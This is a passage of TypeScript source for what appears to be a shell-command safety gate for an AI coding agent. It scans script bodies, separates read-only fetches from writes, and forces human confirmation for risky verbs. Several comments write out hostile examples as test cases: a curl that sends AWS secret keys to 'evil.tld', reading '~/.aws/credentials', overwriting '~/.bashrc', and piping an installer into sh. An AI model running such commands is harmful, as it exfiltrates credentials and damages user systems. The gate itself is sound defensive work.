			kind: "refuse",
			why:
				`script body blocked: ${ref.operand} is ${stat.size} bytes and the review limit ` +
				`leaves ${Math.max(budget, 0)} for it`,
		};
	}
	let read: Buffer;
	try {
		read = fs.readFileSync(file);
	} catch (err) {
		return {
			kind: "refuse",
			why: `script body blocked: ${ref.operand} could not be read (${err instanceof Error ? err.message : String(err)})`,
		};
	}
	// A short read is a file that changed under the gate: the text in hand is not
	// the program the interpreter will run.
	if (read.byteLength !== stat.size) {
		return {
			kind: "refuse",
			why: `script body blocked: ${ref.operand} changed while it was read (${read.byteLength} of ${stat.size} bytes)`,
		};
	}
	return { kind: "body", body: read.toString("utf8") };
}

/** A shell body's here-document payload may itself be executed; refuse rather than mask it as data. */
function shellBodyHeredocRefusal(verb: string, body: string): string | null {
	const grammar = INTERPRETER_FLAG_GRAMMAR[verb] ?? INTERPRETER_FLAG_GRAMMAR[verb.replace(/[\d.]+$/u, "")];
	if (grammar?.stdinFlag !== true || !body.includes("<<")) return null;
	const parsed = parseShell(body);
	if (!parsed.ok) return `script body blocked: ${verb} body heredoc syntax could not be resolved`;
	if (!parsed.commands.some(command => command.redirects.some(redirect => redirect.here))) return null;
	return `script body blocked: ${verb} body contains a heredoc or here-string whose executed payload cannot be scanned safely`;
}

export function readInterpretedScriptBodies(command: string, cwd: string, limit: number): ReadScriptBodiesResult {
	const bodies: InterpretedScriptBody[] = [];
	let text = command;

	// Discovery reads the MASKED text: a heredoc body is data to the shell (and a
	// document written with one must not turn `python3 pkg` inside it into a
	// program this scan insists on reading), while an ANSI-C or crossed quote
	// span is text the shell never parses as a command either. The judged text
	// below stays the whole command: masking is for the scan, not for the judge.
	const masked = maskHeredocBodiesAndAnsiSpans(command).masked;
	const segments = tokenizeShellSegments(masked);
	// The walk resolves `cd` targets the way this reader resolves its operands:
	// the host's `resolveToCwd` knows the internal URL schemes and the
	// workspace-root alias that a plain `path.resolve` would silently turn into
	// a relative-looking path. The network tier resolves config paths with
	// `node:path` and hands the same walk its own resolver instead.
	const dirs = segmentWorkingDirectories(masked, cwd, segments, resolveToCwd);
	const shellAst = command.includes("<") ? parseShell(command) : null;
	const shellCommands: ShellCommand[] = shellAst !== null && shellAst.ok
		? shellAst.commands.filter(candidate => !candidate.nested && candidate.words.length > 0)
		: [];
	let shellCommandIndex = 0;
	for (let index = 0; index < segments.length; index++) {
		const segment = segments[index];
		if (segment.length === 0) continue;

		let headIndex = 0;
		while (
			headIndex < segment.length &&
			(/^[a-z_][a-z0-9_]*=/iu.test(segment[headIndex]) || segment[headIndex] === "{" || segment[headIndex] === "(")
		) {
			headIndex++;
		}
		const head = segment[headIndex];
		let shellCommand: ShellCommand | undefined;
		if (head !== undefined && shellAst !== null && shellAst.ok) {
			for (let candidateIndex = shellCommandIndex; candidateIndex < shellCommands.length; candidateIndex++) {
				const candidate = shellCommands[candidateIndex];
				if (commandBasename(candidate.words[0]?.value.toLowerCase() ?? "") !== commandBasename(head.toLowerCase())) continue;
				shellCommand = candidate;
				shellCommandIndex = candidateIndex + 1;
				break;
			}
		}

		const redirectAt = segment.findIndex(word => word === "<" || word === "<>");
		if (redirectAt !== -1 && (shellAst === null || !shellAst.ok || shellCommand === undefined)) {
			if (interpreterInvocation(segment.slice(0, redirectAt))) {
				return {
					text,
					bodies,
					refusal: { why: "script body blocked: redirected stdin could not be resolved from the shell command" },
				};
			}
		}

		const hasRedirects = (shellCommand?.redirects.length ?? 0) > 0;
		const interpreterWords = hasRedirects && shellCommand
			? shellCommand.words.map(word => word.value)
			: segment;
		const invocation = interpreterInvocation(interpreterWords);
		if (invocation !== null && "opaque" in invocation) {
			return { text, bodies, refusal: { why: invocation.opaque } };
		}
		const syntaxOnly = interpreterSyntaxOnly(interpreterWords);
		const refs = interpreterProgramRefs(interpreterWords).filter(ref => !syntaxOnly || ref.loader === true);
		const flow = hasRedirects && shellCommand ? redirectedStdinFlow(shellCommand.redirects) : null;
		const stdin = syntaxOnly || flow === null ? null : interpreterReadsRedirectedStdin(interpreterWords);
		if (stdin !== null && flow !== null) {
			if (flow.kind === "unknown") {
				return {
					text,
					bodies,
					refusal: { why: "script body blocked: redirected stdin descriptor could not be resolved" },
				};
			}
			if (flow.kind === "file") {
				const target = flow.target;
				if (!target.literal && !SHELL_WORD_EXPANSION.test(target.value)) {
					return {
						text,
						bodies,
						refusal: { why: `script body blocked: redirected stdin target ${target.source} is not literal` },
					};
				}
				refs.push({ verb: stdin.verb, operand: target.value, arm: "stdin" });
			}
		}

		for (const ref of refs) {
			let dir = dirs[index];
			if (ref.arm !== "stdin" && invocation && !("opaque" in invocation) && invocation.cwdChanges) {
				for (const change of invocation.cwdChanges) {
					if (dir === null) break;
					if (SHELL_WORD_EXPANSION.test(change) || change.startsWith("~")) dir = null;
					else dir = resolveToCwd(change, dir);
				}
			}
			if (dir === null) {
				// The shell's directory at this segment is not in the text (a
				// `cd $DIR`, `cd -`, a bare `cd`, `pushd`, or a separator this
				// walk and the tokenizer read differently). Reading from a guessed
				// directory would judge a different file than the interpreter runs.
				const scriptShaped = SCRIPT_FILE_EXTENSION.test(ref.operand) || ref.operand.includes("/");
				if (ref.arm === "load" && !scriptShaped) continue;
				return {
					text,
					bodies,
					refusal: {
						why:
							`script body blocked: the working directory ${ref.verb} would run ${ref.operand} ` +
							`from cannot be resolved from the command text`,
					},
				};
			}
			const label = ref.arm === "stdin"
				? `\n# --- ${ref.verb} reads stdin from ${ref.operand}; body read from disk ---\n`
				: `\n# --- ${ref.verb} runs ${ref.operand}; body read from disk ---\n`;
			const endLabel = `\n# --- end of ${ref.operand} ---`;
			const result = readScriptFile(ref, dir, limit - text.length - label.length - endLabel.length);
			if (result.kind === "skip") continue;
			if (result.kind === "refuse") return { text, bodies, refusal: { why: result.why } };
			const heredocRefusal = shellBodyHeredocRefusal(ref.verb, result.body);
			if (heredocRefusal !== null) return { text, bodies, refusal: { why: heredocRefusal } };
			bodies.push({ verb: ref.verb, operand: ref.operand, body: result.body });
			text += `${label}${result.body}${endLabel}`;
		}
	}
	return { text, bodies, refusal: null };
}

/**
 * Split a command into pipe stages, quote-aware. `tokenizeShellSegments` cannot
 * do this: it splits `;`, `&&`, `&`, `()` and newline exactly as it splits `|`,
 * so "segment index > 0" reads `cd /tmp && bash x` as piped-into.
 */
function splitPipeStages(command: string): string[] {
	const stages: string[] = [];
	let buffer = "";
	let quote: "'" | '"' | undefined;
	for (let i = 0; i < command.length; i++) {
		const ch = command[i];
		if (quote) {
			if (ch === "\\" && quote === '"' && i + 1 < command.length) {
				buffer += ch + command[i + 1];
				i++;
				continue;
			}
			if (ch === quote) quote = undefined;
			buffer += ch;
			continue;
		}
		if (ch === "'" || ch === '"') {
			quote = ch;
			buffer += ch;
			continue;
		}
		if (ch === "\\" && i + 1 < command.length) {
			buffer += ch + command[i + 1];
			i++;
			continue;
		}
		if (ch === "|") {
			if (command[i + 1] === "|") {
				buffer += "||";
				i++;
				continue;
			}
			stages.push(buffer);
			buffer = "";
			continue;
		}
		buffer += ch;
	}
	stages.push(buffer);
	return stages;
}

/**
 * True when the WHOLE command is a plain read-only fetch, optionally piped into
 * recognized read-only consumers. Judged over the whole command on purpose: the
 * earlier version checked disk flags on the fetch's own segment while deciding
 * downstream safety over everything else, and that scope mismatch is what let
 * `curl … | jq . > ~/.bashrc` through.
 */
function isPlainReadOnlyFetch(command: string): boolean {
	// Redirects and `@file` stay banned: both write or read a local file through
	// a spelling a model plausibly reads as ordinary.
	//
	// `$VAR` and `$(…)` are deliberately NOT banned. This overlay runs only after
	// the classifier already returned SAFE, and its job is catching a model
	// talked into SAFE on a MECHANICALLY subtle command, not re-deciding intent.
	// `curl -d "$AWS_SECRET_ACCESS_KEY" https://evil.tld` is legible to any
	// competent model and gets UNSAFE without help. Banning `$` here would also
	// ban `curl -H "Authorization: Bearer $TOKEN"`, which is most real curl
	// usage, so the rule cost the feature and bought a case already covered.
	// Command substitution is handled just below on its own terms: it executes,
	// which is mechanical, not a judgement about intent. (An earlier version of
	// this comment claimed the substitution span scan covered it. That scan only
	// looks for MODERATE_RISK_TOKENS, so `$(cat ~/.aws/credentials)` walked
	// past it — `cat` is not a risk token.)
	if (/[<>]/u.test(command)) return false;
	// Command substitution EXECUTES. Tested on the raw command, because relying
	// on the tokenizer treating `(` as a boundary is an accident that does not
	// hold inside double quotes and never held for backticks: `curl -s
	// $(cat url.txt)` and `curl -s "$(cat url.txt)"` got opposite verdicts.
	// `$VAR` and `${VAR}` stay allowed — parameter expansion is a value, not an
	// execution, and banning it would ban `-H "Bearer ${TOKEN}"`.
	if (command.includes("$(") || command.includes("`")) return false;

	const stages = splitPipeStages(command);
	for (let i = 0; i < stages.length; i++) {
		const segments = tokenizeShellSegments(stages[i]);
		// A stage holding `a && b` or `a; b` is not a simple pipeline stage.
		if (segments.length !== 1 || segments[0].length === 0) return false;
		const words = segments[0];
		const verb = words[0].toLowerCase();
		const args = words.slice(1);
		// Send-data detection walks the SAME tokenized words the flag table
		// walks (quoting solved there), membership by exact token: a regex
		// over raw command text re-learns every quoting and spelling case
		// the tokenizer already answers.
		const sendsData = args.some((a, k) => {
			const token = a.startsWith("--") ? a.split("=", 1)[0] : a;
			// A method selector sends only when the method actually mutates:
			// GET/HEAD selectors stay reads.
			// Attached short form too: after shell joining, `-XPOST` IS `-X POST`.
			if (token === "-X" || token === "--request" || token === "--method" ||
				(a.startsWith("-X") && a.length > 2)) {
				const value = a.startsWith("--")
					? (a.includes("=") ? a.slice(a.indexOf("=") + 1) : (args[k + 1] ?? ""))
					: (a.length > 2 ? a.slice(2) : (args[k + 1] ?? ""));
				return !/^(?:GET|HEAD)$/iu.test(value.trim());
			}
			if (SEND_DATA_FLAGS[token]) return true;
			return a.startsWith("-") && !a.startsWith("--") && a.length > 2 &&
				expandShortBundle(a).some(f => SEND_DATA_FLAGS[f] === true);
		});

		if (i === 0) {
			// Basename, so `/usr/bin/curl -o ~/.bashrc` is still a curl.
			const fetch = commandBasename(verb);
			if (fetch !== "curl" && fetch !== "wget") return false;
			const allowed = fetch === "curl" ? CURL_READ_ONLY_FLAGS : WGET_READ_ONLY_FLAGS;
			// wget writes a file unless stdout is explicit; --spider downloads
			// nothing at all, so it satisfies the same requirement.
			// Decided positionally inside the loop, never by scanning the array:
			// `wget --header --spider …` has --header consume --spider, so a
			// whole-array includes() saw a marker the tool never applies.
			let wgetStdout = fetch === "curl";
			for (let k = 0; k < args.length; k++) {
				const arg = args[k];
				// `@file` names a local file to send. Tested per token, not over
				// the whole command: `https://registry.npmjs.org/@babel/core` is
				// an ordinary URL and scoped packages are common enough that
				// banning `@` outright ate a visible slice of the prompt
				// reduction this exists to deliver.
				if (arg.startsWith("@") || arg.includes("=@")) return false;
				if (!arg.startsWith("-") || arg === "-") continue;
				// wget writes a file unless stdout is explicit; curl is the reverse.
				// `-O` must stand alone. In a bundle, getopt hands the trailing
				// `O-` to the FIRST value-taking flag in the prefix, so `-oO-`
				// is `-o O-` (a log file) and `-O` never applies. Honoring the
				// bundle let `wget -PO-` clear while downloading to ./O-/.
				// A null-device output target discards the fetched content: the
				// fetch is still a read, so it clears egress exactly like stdout
				// would, on any host. `/dev/null` only — a real path stays a
				// write and fails closed at the allowlist below.
				if (fetch === "curl" && (arg === "-o" || arg === "--output")) {
					if (args[k + 1] !== "/dev/null") return false;
					// A request that sends data or mutates is not a read even
					// when the response lands in the null device.
					if (sendsData) return false;
					k++;
					continue;
				}
				if (fetch === "curl" && (arg === "-w" || arg === "--write-out" || arg.startsWith("--write-out="))) {
					const value = arg.includes("=") ? arg.slice(arg.indexOf("=") + 1) : (args[k + 1] ?? "");
					if (!WRITE_OUT_CLEAN_RE.test(value)) return false;
					if (!arg.includes("=")) k++;
					continue;
				}
				if (arg === "--output=/dev/null" && !sendsData) continue;
				if (arg === "--output-document=/dev/null" && !sendsData) {
					wgetStdout = true;
					continue;
				}
				// A `-` value is stdout, handled by the branches below; leave it
				// to them rather than rejecting it here.
				if (
					fetch === "wget" &&
					(arg === "-O" || arg === "--output-document") &&
					args[k + 1] === "/dev/null" &&
					!sendsData
				) {
					wgetStdout = true;
					k++;
					continue;
				}
				if (fetch === "wget" && arg === "--spider") {
					wgetStdout = true;
					continue;
				}
				if (fetch === "wget" && (bundleIsWgetStdout(arg) || arg === "--output-document=-")) {
					wgetStdout = true;
					continue;
				}
				if (fetch === "wget" && (bundleIsWgetStdoutSplit(arg, args[k + 1]) || arg === "--output-document")) {
					if (args[k + 1] !== "-") return false;
					wgetStdout = true;
					k++;
					continue;
				}
				const base = arg.startsWith("--") ? arg.split("=", 1)[0] : arg;
				for (const flag of expandShortBundle(base)) {
					if (!allowed.has(flag)) return false;
				}
				// Skip a consumed value so it cannot pose as a flag next pass.
				if (fetch === "wget" && WGET_VALUE_TAKING_FLAGS.has(base) && !arg.includes("=")) k++;
			}
			if (!wgetStdout) return false;
			continue;
		}

		if (!READ_ONLY_PIPE_CONSUMERS.has(verb)) return false;
		const writeFlag = CONSUMER_WRITE_FLAGS[verb];
		if (writeFlag && args.some(arg => writeFlag.test(arg))) return false;
		for (const arg of args) {
			if (arg === "--") continue; // POSIX end-of-options, not a flag
			if (arg.startsWith("--")) {
				if (!CONSUMER_SAFE_LONG_FLAGS.has(arg.split("=", 1)[0])) return false;
				continue;
			}
			// Short flags are governed by CONSUMER_WRITE_FLAGS per consumer, not
			// by a blanket list: `grep -o` and `rg -o` are --only-matching and
			// read-only while `sort -o` writes, so the same letter means
			// opposite things and only the per-consumer map can tell them apart.
		}
	}
	return true;
}

/**
 * Split a command into top-level `;`/`&&`/`&`/newline commands at TEXT level,
 * quote-aware. The tokenizer splits the same operators but returns word
 * arrays, and joining those words back drops the pipeline shape: the
 * `| jq . > file` tail vanishes, so a fetch decision over a joined segment saw
 * a clean-looking bare curl while the real command wrote ~/.bashrc. A single
 * `|` never splits here — the pipeline is the unit the fetch decision needs.
 * `2>&1` and `<&3` are fd-dups, not background `&`. `||` passes through
 * unsplit; the egress scan splits fallbacks itself (splitOrFallbacks).
 */
function splitTopLevelCommands(command: string): string[] {
	const parts: string[] = [];
	let buffer = "";
	let quote: "'" | '"' | undefined;
	for (let i = 0; i < command.length; i++) {
		const ch = command[i];
		if (quote) {
			if (ch === "\\" && quote === '"' && i + 1 < command.length) {
				buffer += ch + command[i + 1];
				i++;
				continue;
			}
			if (ch === quote) quote = undefined;
			buffer += ch;
			continue;
		}
		if (ch === "'" || ch === '"') {
			quote = ch;
			buffer += ch;
			continue;
		}
		if (ch === "\\" && i + 1 < command.length) {
			buffer += ch + command[i + 1];
			i++;
			continue;
		}
		if (ch === "#" && (buffer.length === 0 || /\s$/u.test(buffer) || /[|&;()<>]$/u.test(buffer))) {
			// A comment runs to end of line: `;`/`&`/`||` inside it are text,
			// not operators (`git status # && ssh host cat` is one command).
			const end = command.indexOf("\n", i);
			buffer += end === -1 ? command.slice(i) : command.slice(i, end);
			i = end === -1 ? command.length : end;
			continue;
		}
		if (ch === ";") {
			parts.push(buffer);
			buffer = "";
			continue;
		}
		if (ch === "&") {
			const prev = command[i - 1];
			if (prev === ">" || prev === "<") {
				buffer += ch;
				continue;
			}
			parts.push(buffer);
			buffer = "";
			if (command[i + 1] === "&") i++;
			continue;
		}
		if (ch === "\n") {
			parts.push(buffer);
			buffer = "";
			continue;
		}
		buffer += ch;
	}
	parts.push(buffer);
	return parts.map(part => part.trim()).filter(part => part.length > 0);
}

/**
 * Quote-aware split on top-level `||`. splitTopLevelCommands leaves `||`
 * unsplit for its own consumers; the egress scan needs the fallback half —
 * `false || ssh host cat` executes the ssh — so it splits `||` itself and
 * scans both sides.
 */
function splitOrFallbacks(command: string): string[] {
	const parts: string[] = [];
	let buffer = "";
	let quote: "'" | '"' | undefined;
	for (let i = 0; i < command.length; i++) {
		const ch = command[i];
		if (quote) {
			if (ch === "\\" && quote === '"' && i + 1 < command.length) {
				buffer += ch + command[i + 1];
				i++;
				continue;
			}
			if (ch === quote) quote = undefined;
			buffer += ch;
			continue;
		}
		if (ch === "'" || ch === '"') {
			quote = ch;
			buffer += ch;
			continue;
		}
		if (ch === "\\" && i + 1 < command.length) {
			buffer += ch + command[i + 1];
			i++;
			continue;
		}
		if (ch === "#" && (buffer.length === 0 || /\s$/u.test(buffer) || /[|&;()<>]$/u.test(buffer))) {
			// A word-initial `#` opens a comment: nothing after it executes,
			// so a `||` in comment text must not split (`git status # || ssh`).
			const end = command.indexOf("\n", i);
			buffer += end === -1 ? command.slice(i) : command.slice(i, end);
			i = end === -1 ? command.length : end;
			continue;
		}
		if (ch === "|" && command[i + 1] === "|") {
			parts.push(buffer);
			buffer = "";
			i++;
			continue;
		}
		buffer += ch;
	}
	parts.push(buffer);
	return parts.map(part => part.trim()).filter(part => part.length > 0);
}

/**
 * When `cwd` is not supplied (unit tests, eval harness), an absolute/~ target
 * cannot be proven inside the working directory, so the conservative default
 * is a path nothing resolves under: the outside-cwd shape test then fails
 * closed. Temp-dir exclusions still apply without a cwd.
 */
const MATCHER_CWD_UNKNOWN = "/__matcher_cwd_unknown__";

/**
 * rm/unlink forced-dialog shape. The token alone no longer forces a dialog —
 * deleting a NAMED file is ordinary reversible-ish work the judge owns. The
 * forced dialog stays for the shapes where a mistake is systemic: recursion
 * (a flag miss deletes a tree), glob metacharacters (the target set is the
 * shell's, not the author's), a `..` traversal (escapes the stated scope),
 * dotfiles/dot-paths (configuration and VCS state, invisible in listings),
 * and targets provably outside the working directory (temp dirs excluded —
 * scratch under /tmp is routine). Quoted globs flag too: the tokenizer strips
 * quotes, and flagging is the safe direction on ambiguity.
 */
function rmForcesDialog(args: readonly string[], cwd: string): boolean {
	let endOfFlags = false;
	for (const arg of args) {
		if (!endOfFlags && arg === "--") {
			endOfFlags = true;
			continue;
		}
		if (!endOfFlags && arg.startsWith("-")) {
			if (arg === "--recursive" || /^-[a-z]*r[a-z]*$/u.test(arg)) return true;
			continue;
		}
		if (/[*?[]/u.test(arg)) return true;
		const components = arg.split("/");
		if (components.some(c => c === "..")) return true;
		if (components.some(c => c.startsWith(".") && c !== "." && c !== "..")) return true;
		if (writeTargetOutsideCwd(arg, cwd)) return true;
	}
	return false;
}

export function matchModerateRiskTokens(
	command: string,
	cwd?: string,
	options?: { skipWriteStrip?: boolean },
): string[] {
	const effectiveCwd = cwd ?? MATCHER_CWD_UNKNOWN;
	// POSIX deletes a backslash-newline pair before word splitting; the
	// tokenizer keeps it, which would split `rm` into r/NL/m. Remove the pairs
	// for MATCHING purposes so the splice reads as one verb.
	// A body written straight to a file comes off the RAW command first: it is
	// stdin data, and leaving it inline let its words read as a command line.
	// Every other heredoc keeps its body, and its words keep being scanned.
	// POSIX deletes a backslash-newline pair before word splitting; the
	// tokenizer keeps it, which would split `rm` into r/NL/m. Remove the pairs
	// for MATCHING purposes so the splice reads as one verb.
	const stripped = options?.skipWriteStrip ? command : withoutWrittenHeredocBodies(command);
	// Issues #60/#61: heredoc-bounded bodies and ANSI-C `$'...'` spans are
	// blanked out of the text the tokenizer reads, because both put the
	// plain quote state machine into a quote it never leaves (an unbalanced
	// `"` in a body, `\'` inside `$'...'`). The blanked regions are scanned
	// as separate units below, so their risk tokens still flag — the mask
	// changes WHERE a chunk is tokenized, never WHETHER it is scanned.
	const { masked, bodies, quoted } = maskHeredocBodiesAndAnsiSpans(stripped);
	const normalized = masked.replace(/\\\r?\n/gu, "");
	const segments = tokenizeShellSegments(normalized);
	const flags = new Set<string>();

	// Anything fed into an interpreter executes code the gate never saw. Purely
	// additive, and independent of the fetch rules: `cat ./installer | sh` has
	// no curl in it. When the payload is code the classifier read verbatim —
	// an inline -c/-e payload, or a heredoc body — the same plain-code release
	// rule applies as for a non-piped interpreter: only obfuscation markers
	// or destructive verbs keep the flag. Opaque stdin (`cat ./installer | sh`)
	// always flags: the SAFE says nothing about what stdin carries.
	// This scan is TEXT-level (heredocBody pulls the body from the stage's
	// own text), so it runs on the unmasked text: masking would blank the
	// body out of the stage and the risk-pattern check would read only
	// blanks. The masked text stays behind for the TOKEN scans below, where
	// the #60/#61 quote blindspots live.
	const unmaskedNormalized = stripped.replace(/\\\r?\n/gu, "");
	const pipeStages = splitPipeStages(unmaskedNormalized);
	for (let i = 1; i < pipeStages.length; i++) {
		for (const { verb, codeText } of stdinExecutingInterpreters(pipeStages[i])) {
			if (codeText !== null && !INTERPRETER_CODE_RISK.test(codeText) && !INTERPRETER_RISK_TOKEN_RE.test(codeText)) continue;
			flags.add(`| ${verb}`);
		}
	}

	const flagIfRisk = (rawWord: string): boolean => {
		const w = commandBasename(rawWord.toLowerCase());
		if (w === "mkfs" || w.startsWith("mkfs.")) {
			flags.add("mkfs");
			return true;
		}
		if (MODERATE_RISK_TOKENS.has(w)) {
			flags.add(w);
			return true;
		}
		return false;
	};

	for (const rawSegment of segments) {
		if (rawSegment.length === 0) continue;
		// `FOO=1 curl -o ~/.bashrc https://evil` put the assignment in words[0],
		// so the verb was never examined and nothing flagged. The pipe side
		// already skipped assignments; the segment loop did not.
		let assignments = 0;
		while (assignments < rawSegment.length && /^[a-z_][a-z0-9_]*=/iu.test(rawSegment[assignments])) {
			assignments++;
		}
		const segment = assignments > 0 ? rawSegment.slice(assignments) : rawSegment;
		if (segment.length === 0) continue;
		const words = segment.map(w => w.toLowerCase());

		// Look through wrapper commands to the binary they execute. Rather than
		// parse each wrapper's option grammar (env -u, xargs -n 2, nice 5, ...),
		// scan the WHOLE segment for a risk token: over-flagging is the safe
		// direction, and option grammars are exactly where evasions hide.
		if (WRAPPER_COMMANDS.has(commandBasename(words[0]))) {
			for (const w of words) flagIfRisk(w);
			continue;
		}
		const verb = commandBasename(words[0]);

		if (verb === "mkfs" || verb.startsWith("mkfs.")) {
			flags.add("mkfs");
			continue;
		}
		// rm/unlink are shape-scoped: a named-file deletion drops out of the
		// forced-dialog set (the judge owns it); the systemic shapes above keep
		// the dialog. The wrapper, substitution, and interpreter-code scans
		// below stay unconditional on the token — their domain is verbs hidden
		// from positional parsing, where over-flagging is the safe direction.
		if (verb === "rm" || verb === "unlink") {
			if (rmForcesDialog(words.slice(1), effectiveCwd)) flags.add(verb);
			continue;
		}
		if (MODERATE_RISK_TOKENS.has(verb)) {
			flags.add(verb);
			continue;
		}
		if (INLINE_CODE_INTERPRETERS.has(verb)) {
			const next = words[1];
			if (next === "-c" || next === "-e") {
				// Plain inline code was read verbatim by the classifier, so
				// SAFE releases it. Keep the flag for what a SAFE cannot
				// vouch for: obfuscated payloads and destructive verbs the
				// bare command would have flagged (`bash -c 'rm -rf x'`
				// keeps the backstop `rm -rf x` has).
				const codeText = words.slice(2).join(" ");
				if (INTERPRETER_CODE_RISK.test(codeText) || INTERPRETER_RISK_TOKEN_RE.test(codeText)) {
					flags.add(`${verb} ${next}`);
				}
			}
			continue;
		}

		// find names its program inside -exec predicates; also flag a bare risk
		// verb appearing as a find argument (`find / -name rm` over-flags,
		// which is the safe direction).
		if (verb === "find") {
			let flagged = false;
			for (let k = 1; k < words.length && !flagged; k++) {
				if ((words[k] === "-exec" || words[k] === "-execdir") && flagIfRisk(words[k + 1] ?? "")) flagged = true;
			}
			for (let k = 1; k < words.length && !flagged; k++) {
				flagIfRisk(words[k]);
			}
			continue;
		}

		// git: global options may consume values (-C dir, -c k=v); after those,
		// the first remaining word is the subcommand. Only the irreversible
		// subcommands keep the SAFE-verdict dialog: `git reset --hard` and
		// `git clean` erase uncommitted work (an unambiguous --hard prefix
		// counts; an ambiguous one like --h fails closed), while pushes flag
		// only genuine history rewrites so a steered-SAFE verdict cannot
		// release a compound force-push silently — the bash.patterns force
		// prompts bail on shell control, so this overlay is the only backstop
		// for force-pushes inside compounds. Everything else — commit, --amend
		// included (reflog keeps the pre-amend commit), reset --soft/--mixed,
		// path restores — is reflog/index-reversible and model-decided.
		if (verb === "git") {
			let sub = "";
			for (let k = 1; k < words.length; k++) {
				const w = words[k];
				if (w.startsWith("-")) {
					if (GIT_VALUE_OPTIONS.has(w)) k += 1;
					continue;
				}
				if (sub === "") {
					if (w === "reset") {
						if (words.slice(k + 1).some(x => x === "--hard" || ("--hard".startsWith(x) && x.length >= 3))) {
							flags.add("git reset");
						}
					} else if (w === "clean") {
						flags.add("git clean");
					} else if (w === "push") {
						if (words.some(x => x === "-f" || x.startsWith("--force"))) {
							flags.add("git push --force");
						}
					}
					sub = w;
				}
			}
			continue;
		}
	}

	// Words carrying an attached redirection (`rm>/tmp x`): the tokenizer has no
	// redirect operator, so the redirect fuses into the token. Check the prefix
	// before the first redirect character.
	for (const segment of segments) {
		for (const word of segment) {
			const m = /^([^<>]+)[<>]/u.exec(word);
			if (m) flagIfRisk(m[1]);
		}
	}

	// Command substitution is outside the tokenizer's scope, so a risk verb
	// inside a substitution cannot be cleared by position: `echo "$(rm
	// important)"` would otherwise auto-run. Narrow to what the substitution
	// actually CONTAINS — the spans the parser finds at every depth, quoted
	// ones correctly read as data — and flag risk verbs only inside those
	// spans. Text outside (`grep $(git rev-parse HEAD) file`) stays on the
	// graceful path.
	addSubstitutionFlags(normalized, flags);

	// The masked regions (#60 heredoc bodies, #61 quote spans) carry their own
	// live commands under scan, so each is tokenized as its own unit with the
	// SAME rules (recursive: a body can hold a nested heredoc). The visited
	// set stops the recursion when a piece re-extracts itself (an unclosed
	// quote's span is its own mask output): no new text, nothing new to scan.
	// A body piece skips the write-strip: the piece sits inside a body region
	// the outer scan owns, where an unquoted outer delimiter means the shell
	// EXPANDS the nested body before the owner command reads it, and an
	// unterminated outer heredoc means nothing has decided the nested text is
	// data. Both directions leave the nested words live, so the piece scans
	// raw; the graceful-release rule (strip = inert) applies only to
	// standalone write bodies, which the plain-scan path already handled.
	const seenPieces = new Set<string>([stripped]);
	const queue = [...bodies, ...quoted];
	while (queue.length > 0) {
		const rawPiece = queue.pop() as string;
		if (seenPieces.has(rawPiece)) continue;
		seenPieces.add(rawPiece);
		for (const flag of matchModerateRiskTokens(rawPiece, effectiveCwd, { skipWriteStrip: true })) flags.add(flag);
	}
	return [...flags].sort();
}

/** Risk verbs inside `$(…)`, `<(...)` and backtick spans of `text`.
 *  Substitution is outside the tokenizer's scope, so a verb in one cannot be
 *  cleared by position: `echo "$(rm important)"` would otherwise auto-run.
 *  {@link substitutionSpans} reads the spans off the parsed AST, so quoting is
 *  honoured — the `$(rm …)` inside `'…'` is data and raises nothing — and
 *  nesting and process substitution are seen at every depth. Narrowed to what
 *  a span actually CONTAINS, so `grep $(git rev-parse HEAD) file` stays on the
 *  graceful path. */
function addSubstitutionFlags(text: string, flags: Set<string>): void {
	for (const span of substitutionSpans(text)) {
		for (const token of MODERATE_RISK_TOKENS) {
			if (new RegExp(`\\b${token}\\b`, "iu").test(span)) flags.add(token);
		}
		if (/^mkfs\b|^mkfs\./iu.test(span.trim())) flags.add("mkfs");
	}
}

/**
 * Dialog footnote when a forced prompt fires on the rm family: the user asked
 * for a nudge toward the reversible alternative. Empty for every other flag
 * family — a tee/dd/sudo dialog is an unrelated class. Display-only: the
 * DecisionRecord keeps the bare flags list.
 */
export function trashFootnote(flags: readonly string[]): string {
	return flags.some(f => f === "rm" || f === "unlink") ? "Reversible alternative: trash <paths>" : "";
}

function sessionCache(sessionId: string): Map<string, Judgement> {
	let scoped = cache.get(sessionId);
	if (!scoped) {
		scoped = new Map();
		cache.set(sessionId, scoped);
	}
	return scoped;
}

function remember(scoped: Map<string, Judgement>, key: string, judgement: Judgement): void {
	// Dry-run probe (issue #32): a cached verdict may be FOLLOWED (no model
	// call either way) but never written.
	if (dryRun) return;
	// Overwriting an existing key cannot grow the map, so evict only for a new
	// one — otherwise re-caching a key (UNSAFE verdict, then the human's
	// session grant) throws away an unrelated command's verdict.
	if (!scoped.has(key)) {
		// Evict oldest first (Map keeps insertion order); clearing wholesale would
		// forget every UNSAFE verdict a long session already paid for.
		while (scoped.size >= CACHE_CAP) {
			const oldest = scoped.keys().next().value;
			if (oldest === undefined) break;
			scoped.delete(oldest);
		}
	}
	scoped.set(key, judgement);
}

function sessionRefusals(sessionId: string): Refusal[] {
	let list = refusals.get(sessionId);
	if (!list) {
		list = [];
		refusals.set(sessionId, list);
	}
	return list;
}

/** Record a refusal. Bookkeeping must never decide the command, so the host
 *  read is guarded like the diagnostic block above the gate. */
function addRefusal(
	ctx: ExtensionContext,
	command: string,
	why: string,
	meta: {
		source?: Refusal["source"];
		cwd?: string;
		evidenceFingerprint?: string;
	} = {},
): void {
	// Dry-run probe (issue #32): records nothing.
	if (dryRun) return;
	try {
		const target = normalizeGrantTarget(command);
		if (target === "") return;
		const list = sessionRefusals(ctx.sessionManager.getSessionId());
		const refusalCwd = meta.cwd ?? "";
		// A re-refusal of the same target refreshes the record and moves it to
		// newest instead of stacking duplicates behind one dialog sequence. The
		// same normalized action in two directories is two different reviews.
		const existing = list.findIndex(refusal => refusal.normalizedTarget === target && refusal.cwd === refusalCwd);
		if (existing !== -1) list.splice(existing, 1);
		while (list.length >= REFUSAL_CAP) list.shift();
		list.push({
			normalizedTarget: target,
			why,
			ts: Date.now(),
			source: meta.source ?? "model",
			cwd: refusalCwd,
			...(meta.evidenceFingerprint === undefined ? {} : { evidenceFingerprint: meta.evidenceFingerprint }),
		});
	} catch {
		// No session id, no memory; the caller's decision below is unchanged.
	}
}

/** A user approval of a target erases the memory that it was refused. Approving
 *  and refusing use one identity, so the lift covers exactly what the refusal
 *  remembered (issue #64). */
function liftRefusals(ctx: ExtensionContext, command: string, cwd = ""): void {
	try {
		const sessionId = ctx.sessionManager.getSessionId();
		const target = normalizeGrantTarget(command);
		if (target === "") return;
		const list = refusals.get(sessionId);
		if (!list) return;
